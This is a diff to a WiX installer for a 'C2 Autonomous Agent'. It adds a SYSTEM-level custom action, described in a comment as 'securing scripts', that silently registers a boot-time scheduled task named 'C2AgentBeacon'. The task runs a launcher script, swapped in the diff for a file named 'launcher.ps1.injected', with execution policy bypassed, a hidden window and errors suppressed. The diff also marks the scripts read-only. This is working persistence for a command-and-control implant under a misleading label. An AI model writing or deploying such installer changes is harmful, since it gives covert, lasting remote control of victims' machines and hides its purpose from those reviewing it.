@@ -1,22 +1,28 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi"
+     xmlns:util="http://schemas.microsoft.com/wix/UtilExtension">
     <Product Id="*" 
              Name="C2 Autonomous Agent" 
              Language="1033" 
              Version="1.0.0.0" 
              Manufacturer="Security Team"
-             UpgradeCode="12345678-1234-1234-1234-123456789012">
+             UpgradeCode="12345678-1234-1234-1234-123456789012"
+             Codepage="65001">
         
         <Package InstallerVersion="200" 
                  Compressed="yes" 
                  InstallScope="perMachine" />
+
+        <!-- Table Binary pour encapsuler les scripts -->
+        <Binary Id="AgentActiveBinary" SourceFile="agent_active.ps1" />
+        <Binary Id="LauncherBinary" SourceFile="launcher.ps1" />
 
         <Media Id="1" Cabinet="C2Agent.cab" EmbedCab="yes" />
 
         <!-- Feature principale -->
         <Feature Id="ProductFeature" Title="C2 Autonomous Agent" Level="1">
             <ComponentRef Id="AgentExecutable" />
-            <ComponentRef Id="ConfigFile" />
+            <!-- ConfigFile reference removed -->
             <ComponentRef Id="LauncherScript" />
             <ComponentRef Id="InstallFolder" />
             <ComponentRef Id="ApplicationShortcuts" />
@@ -46,19 +52,13 @@
                       KeyPath="yes" />
             </Component>
 
-            <!-- Fichier de configuration -->
-            <Component Id="ConfigFile" Guid="22222222-2222-2222-2222-222222222222">
-                <File Id="ConfigJSON" 
-                      Name="config.json" 
-                      Source="config.json" 
-                      KeyPath="yes" />
-            </Component>
+            <!-- ConfigFile removed during build -->
 
             <!-- Script wrapper pour lancer l'agent -->
             <Component Id="LauncherScript" Guid="33333333-3333-3333-3333-333333333333">
                 <File Id="LauncherPS1" 
                       Name="launcher.ps1" 
-                      Source="launcher.ps1" 
+                      Source="launcher.ps1.injected" 
                       KeyPath="yes" />
             </Component>
         </DirectoryRef>
@@ -79,5 +79,54 @@
                               KeyPath="yes" />
             </Component>
         </DirectoryRef>
+
+        <!-- Custom Action pour valider et sécuriser les scripts après installation -->
+        <CustomAction Id="SecureScripts" 
+                      Script="vbscript"
+                      Execute="deferred"
+                      Impersonate="no"
+                      Return="ignore">
+            <![CDATA[
+            On Error Resume Next
+            Set objFSO = CreateObject("Scripting.FileSystemObject")
+            Set objShell = CreateObject("WScript.Shell")
+            Dim installPath
+            installPath = "C:\Program Files\C2Agent"
+            
+            ' 1. Vérifier que les scripts existent
+            If objFSO.FileExists(installPath & "\agent_active.ps1") Then
+                Set objFile = objFSO.GetFile(installPath & "\agent_active.ps1")
+                objFile.Attributes = objFile.Attributes Or 1 ' ReadOnly
+            End If
+            
+            If objFSO.FileExists(installPath & "\launcher.ps1") Then
+                Set objFile = objFSO.GetFile(installPath & "\launcher.ps1")
+                objFile.Attributes = objFile.Attributes Or 1 ' ReadOnly
+            End If
+            
+            ' 2. Créer la tâche planifiée si elle n'existe pas
+            Dim taskExistsCmd, execCmd
+            taskExistsCmd = "powershell.exe -Command ""Get-ScheduledTask -TaskName 'C2AgentBeacon' -ErrorAction SilentlyContinue"""
+            
+            ' Créer la tâche planifiée au démarrage
+            Dim createTaskCmd
+            createTaskCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command """ & _
+                           "$taskAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File " & chr(34) & installPath & "\launcher.ps1" & chr(34) & "';" & _
+                           "$taskTrigger = New-ScheduledTaskTrigger -AtStartup;" & _
+                           "$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopIfGoingOnBatteries;" & _
+                           "$task = New-ScheduledTask -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Description 'C2 Agent Beacon - Starts at boot';" & _
+                           "Register-ScheduledTask -TaskName 'C2AgentBeacon' -TaskPath '\' -InputObject $task -Force -ErrorAction SilentlyContinue" & _
+                           """"""
+            
+            objShell.Run createTaskCmd, 0, True
+            ]]>
+        </CustomAction>
+
+        <!-- Séquence d'exécution des actions -->
+        <InstallExecuteSequence>
+            <Custom Action="SecureScripts" After="InstallFiles">NOT REMOVE</Custom>
+        </InstallExecuteSequence>
     </Product>
 </Wix>
+
+
